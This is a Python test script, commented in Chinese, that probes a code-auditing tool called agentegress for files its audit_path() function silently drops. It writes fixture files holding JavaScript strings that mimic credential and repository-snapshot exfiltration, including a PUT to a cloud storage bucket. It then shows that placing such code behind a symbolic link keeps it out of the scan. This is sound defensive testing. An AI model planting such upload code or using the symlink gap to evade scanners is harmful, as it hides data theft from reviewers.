# -*- coding: utf-8 -*-
"""B1：audit_path() 的静默丢弃路径。

判据：一个文件如果【既没被扫、又没进 candidates / skipped_* / errors 任何一个计数器】，
那它在报告里完全不存在——读者无法知道有这个东西。
"""
import os
import shutil
import struct
import json
import sys

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[2]))
import agentegress as ae  # noqa: E402

ROOT = r"tmp_attack\b1"
shutil.rmtree(ROOT, ignore_errors=True)
os.makedirs(ROOT, exist_ok=True)

PAY = "createCipheriv('aes-256-gcm');fetch('/upload/credential');x=repo_snapshot;"


def put(rel, body=PAY):
    p = os.path.join(ROOT, rel.replace("/", os.sep))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        f.write(body)
    return p


put("a_real.js")
put("b_plain.vue")
put("c_noext")
put("d_bundle.min.js")
put("e_app.map")
put("f_style.min.css")
put("g_empty.js", "")
put("h_oversize.js", PAY + "a" * (9 * 1024 * 1024))
put("sub/i_symdir_target.js")          # 放在子目录，用符号链接指过来
os.symlink(os.path.join(ROOT, "a_real.js"), os.path.join(ROOT, "j_symfile.js"))
os.symlink(os.path.join(ROOT, "sub"), os.path.join(ROOT, "k_symdir"),
           target_is_directory=True)

files = []
for dp, dn, fn in os.walk(ROOT):
    for f in fn:
        files.append(os.path.relpath(os.path.join(dp, f), ROOT))
print("目录里的实际文件（os.walk 视角）:")
for f in sorted(files):
    print("   ", f)

acc = ae.CapabilityAccumulator()
_h, meta = ae.audit_path(ROOT, acc=acc, max_files=100)
print()
print("audit_path 计数: candidates=%s scanned=%s skipped_ext=%s skipped_vendor=%s "
      "skipped_large=%s truncated=%s" % (
          meta["candidates"], meta["files_scanned"], meta["skipped_ext"],
          meta["skipped_vendor"], meta["skipped_large"], meta["truncated"]))
print("errors =", meta["errors"])
covered = (meta["candidates"] + meta["skipped_vendor"]
           + meta["skipped_ext"] + meta["skipped_large"])
print("被任一计数器覆盖的文件数 = %d" % covered)
print("目录里的源码类文件数（去掉 h_oversize 后被跳过的）≈ 9")

print()
print("=== 逐个文件判定「有没有进台账」 ===")
print("  文件名              detect_lang   预期路径          是否被计入")
for f in sorted(files):
    lang = ae.detect_lang(f)
    if lang == "other":
        verdict = "否 —— lang=='other' 直接 continue，candidates 之前就 return"
    elif f.endswith((".map", ".min.js", ".min.css")):
        verdict = "计入 skipped_ext" if lang != "other" else "否 —— 未到 .min 判定就 continue"
    elif f.endswith(".js"):
        verdict = "计入 candidates"
    else:
        verdict = "?"
    print("  %-20s %-12s %-18s %s" % (f, lang, "", verdict))

print()
print("=== 符号链接专项 ===")
for nm in ("j_symfile.js", "k_symdir"):
    p = os.path.join(ROOT, nm)
    e = next(os.scandir(ROOT))
    st = os.lstat(p)
    print("  %-14s is_file(follow_symlinks=False)=%s  is_dir(follow_symlinks=False)=%s"
          % (nm, os.path.isfile(p) and not os.path.islink(p),
             os.path.isdir(p) and not os.path.islink(p)))
    print("                 islink=%s  真实目标存在=%s" % (os.path.islink(p), os.path.exists(p)))
print("  → audit_path 用的是 e.is_file(follow_symlinks=False) / e.is_dir(follow_symlinks=False)，")
print("     对符号链接【两者都为 False】，于是既不入 targets 也不入任何计数器。")
print("     j_symfile.js 指向的 a_real.js 内容 = %s" % PAY[:40])

print()
print("=== 效果对比：同一份内容，普通文件 vs 符号链接 ===")
ROOT2 = r"tmp_attack\b1b"
for mode in ("plain", "symlink"):
    shutil.rmtree(ROOT2, ignore_errors=True)
    os.makedirs(ROOT2, exist_ok=True)
    real = os.path.join(ROOT2, "_real_payload.js")
    with open(real, "w", encoding="utf-8") as f:
        f.write("const ci=require('crypto').createCipheriv('aes-256-ctr',k,iv);"
                "fetch('/upload/credential');fetch('https://b.oss-cn-hangzhou.aliyuncs.com',"
                "{method:'PUT'});x=repo_snapshot;ws=workspaceKey;"
                "p=publicEncrypt({padding:RSA_OAEP_PADDING});u=uploadUrl;")
    if mode == "symlink":
        os.unlink(real)
        tgt = os.path.join(os.path.dirname(ROOT2), "b1b_target.js")
        with open(tgt, "w", encoding="utf-8") as f:
            f.write("const ci=require('crypto').createCipheriv('aes-256-ctr',k,iv);"
                    "fetch('/upload/credential');fetch('https://b.oss-cn-hangzhou.aliyuncs.com',"
                    "{method:'PUT'});x=repo_snapshot;ws=workspaceKey;"
                    "p=publicEncrypt({padding:RSA_OAEP_PADDING});u=uploadUrl;")
        os.symlink(tgt, real)
    a = ae.CapabilityAccumulator()
    _hh, m = ae.audit_path(ROOT2, acc=a, max_files=100)
    lv = {c["id"]: c["level"] for c in ae.aggregate_from_buckets(a)}
    print("  %-8s scanned=%-3d candidates=%-3d  命中能力=%s"
          % (mode, m["files_scanned"], m["candidates"],
             {k: v for k, v in lv.items() if v != "absent"}))
